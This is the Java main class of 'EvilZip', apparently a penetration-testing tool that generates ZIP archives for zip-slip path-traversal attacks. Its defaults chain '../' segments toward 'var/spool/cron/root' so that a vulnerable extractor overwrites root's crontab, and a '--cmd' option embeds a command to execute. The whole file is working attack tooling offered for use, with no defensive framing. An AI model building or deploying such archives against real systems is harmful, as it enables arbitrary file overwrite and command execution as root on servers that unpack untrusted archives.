package net.thekingofduck;

import com.beust.jcommander.JCommander;
import net.thekingofduck.core.ZipHelper;
import net.thekingofduck.utils.Regex;
import net.thekingofduck.utils.RegexValidator;
import com.beust.jcommander.Parameter;
import org.apache.commons.lang.StringUtils;

import java.io.*;


/**
 * Project: evilzip
 * Date:2021/6/30 上午11:31
 * @author CoolCat
 * @version 1.0.0
 * Github:https://github.com/TheKingOfDuck
 * When I wirting my code, only God and I know what it does. After a while, only God knows.
 */
public class EvilZip {

    private static final String DEFAULTS_OUTPUT_FILENAME = "evil.zip";
    private static final Integer DEFAULTS_TRAVERSE_DEPTH = 8;
    private static final String DEFAULTS_OS = "unix";
    private static final String DEFAULTS_TRAVERSE_PATH = "var/spool/cron/";
    private static final String DEFAULTS_TRAVERSE_FILENAME = "root";
    private static final String DEFAULTS_PASSWORD = null;

    @Parameter(names = {"-f","--file"}, required = false, description = "File to input archive.", order = 0)
    public static String inputFile = DEFAULTS_TRAVERSE_FILENAME;

    @Parameter(names = {"-p","--path"}, required = false, description = "Path to include in filename after traversal", order = 1)
    public static String outputPath = DEFAULTS_TRAVERSE_PATH;

    @Parameter(names = {"-pwd","--password"}, required = false, description = "ZIP file encrypt password.", order = 1)
    public static String password = DEFAULTS_PASSWORD;

    @Parameter(names = {"-o","--output"}, required = false, description = "File to output archive.", order = 2)
    public static String savePath = DEFAULTS_OUTPUT_FILENAME;

    @Parameter(names = {"-d","--depth"}, required = false, description = "Number directories to traverse.", order = 3)
    public static Integer depth = DEFAULTS_TRAVERSE_DEPTH;

    @Parameter(names = {"-t","--type"}, required = false, description = "OS platform for archive (win|unix).", validateWith=  RegexValidator.class, order = 4)
    @Regex("(win|unix)")
    public static String os = DEFAULTS_OS;

    @Parameter(names = {"-c","--cmd"}, required = false, description = "Command to execute.", order = 5)
    public static String cmd = null;

    @Parameter(names = {"-h","--help"}, help = true,required = false, description = "Show this message", order = 6)
    private boolean help;

    public static void main(String[] args) {

        EvilZip evilZip = new EvilZip();
        JCommander evilZipArgs = JCommander.newBuilder().addObject(evilZip).build();
        evilZipArgs.parse(args);
        evilZip.run(evilZipArgs,args);

        String separator = "/";
        if (!os.equals(DEFAULTS_OS)){
            separator = "\\";
        }

        String payload = StringUtils.repeat(".." + separator, depth);
        String fullpath = String.format("%s%s%s",payload,outputPath,inputFile);

        if (StringUtils.isNotBlank(cmd)){
            System.out.println(
                    String.format(
                            "[+] CONFIG:\n\tCOMMOND: %s\n\tINPUT_FILENAME: %s\n\tTRAVERSE_DEPTH: %d\n\tOS: %s\n\tTRAVERSE_PATH: %s\n\tOUT_FILENAME: %s\n\tZIP_PASSWORD: %s",
                            cmd,
                            inputFile,
                            depth,
                            os,
                            outputPath,
                            savePath,
                            password
                    )
            );
        }else {
            System.out.println(
                    String.format(
                            "[+] CONFIG:\n\tINPUT_FILENAME: %s\n\tTRAVERSE_DEPTH: %d\n\tOS: %s\n\tTRAVERSE_PATH: %s\n\tOUT_FILENAME: %s\n\tZIP_PASSWORD: %s",
                            inputFile,
                            depth,
                            os,
                            outputPath,
                            savePath,
                            password
                    )
            );
        }

        String info = String.format("[+] Creating %s containing %s",savePath,fullpath);
        System.out.println(info);

        try {
            ZipHelper.compress(inputFile,fullpath,password,cmd,savePath);
        }catch (Exception e){
            System.out.println(String.format("[!] %s",e.getMessage()));
            return;
        }

        File before = new File(inputFile);
        File after = new File(savePath);
        if (after.exists()){
            String done = String.format("[+] Done: row size %sb, after compress %sb",
                    before.length(),
                    after.length()
            );
            System.out.println(done);
        }


    }

    public void run(JCommander jCommander,String[] args) {

        String logo = "███████╗██╗   ██╗██╗██╗     ███████╗██╗██████╗ \n" +
                "██╔════╝██║   ██║██║██║     ╚══███╔╝██║██╔══██╗\n" +
                "█████╗  ██║   ██║██║██║       ███╔╝ ██║██████╔╝\n" +
                "██╔══╝  ╚██╗ ██╔╝██║██║      ███╔╝  ██║██╔═══╝ \n" +
                "███████╗ ╚████╔╝ ██║███████╗███████╗██║██║     \n" +
                "╚══════╝  ╚═══╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝     \n" +
                "    Author: https://github.com/TheKingOfDuck   ";
        if (args.length == 0){
            System.out.println(logo);
            System.out.println("[+] Usages: java -jar EvilZip.jar -h");
            System.exit(0);
        }
        if (help){
            jCommander.setProgramName("java -jar EvilZip.jar");
            jCommander.usage();
            System.exit(0);
        }
    }
}
